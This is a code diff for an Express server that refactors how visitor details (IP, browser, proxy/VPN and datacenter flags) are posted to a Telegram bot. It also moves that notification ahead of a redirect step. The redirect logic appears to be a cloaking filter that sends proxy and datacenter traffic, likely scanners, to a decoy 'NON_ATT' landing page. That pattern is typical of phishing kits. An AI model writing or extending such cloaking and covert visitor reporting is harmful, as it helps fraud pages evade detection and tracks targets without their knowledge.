@@ -268,7 +268,7 @@ app.get('/init', async (req, res) => {
                 chat_id: TELEGRAM_CHAT_ID,
                 text: `✨ *FORCED REDIRECT VISIT* \n\n📍 *IP:* ${clientIp}\n💻 *Browser:* ${userAgent}\n🕒 *Time:* ${new Date().toLocaleString()}`,
                 parse_mode: 'Markdown'
-            });
+            }, { timeout: 5000 });
         } catch (e) {
             console.error('[Telegram] Forced visit notification failed:', e.response?.data || e.message);
         }
@@ -316,17 +316,6 @@ app.get('/init', async (req, res) => {
     if (isSuspicious) message += `🛡️ *Flags:* ${isProxy ? 'Proxy/VPN ' : ''}${isHosting ? 'DataCenter' : ''}\n`;
     message += `🕒 *Time:* ${new Date().toLocaleString()}`;
 
-    try {
-        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-        }, { timeout: 5000 });
-        console.log('[Telegram] Notification successfully sent for IP:', clientIp);
-    } catch (e) {
-        console.error('[Telegram] Notification failed:', e.response?.data || e.message);
-    }
-
     // 4. FINAL REDIRECT LOGIC
     let targetUrl = NON_ATT_LANDING_PAGE;
     const isSuspiciousMatch = settings.isSuspiciousEnabled && (isProxy || isHosting);
@@ -347,6 +336,15 @@ app.get('/init', async (req, res) => {
             targetUrl = NON_ATT_LANDING_PAGE;
         }
     }
+
+    // Send Telegram Notification in background (don't await)
+    axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+    }, { timeout: 8000 })
+    .then(() => console.log('[Telegram] Notification successfully sent for IP:', clientIp))
+    .catch(e => console.error('[Telegram] Notification failed:', e.response?.data || e.message));
 
     res.json({ redirect: targetUrl });
 });
@@ -633,7 +631,7 @@ app.post('/api/telegram', async (req, res) => {
             chat_id: TELEGRAM_CHAT_ID,
             text: message,
             parse_mode: 'Markdown'
-        });
+        }, { timeout: 5000 });
         res.status(200).send('Message sent successfully');
     } catch (error) {
         console.error('Error sending message:', error.response?.data || error.message);
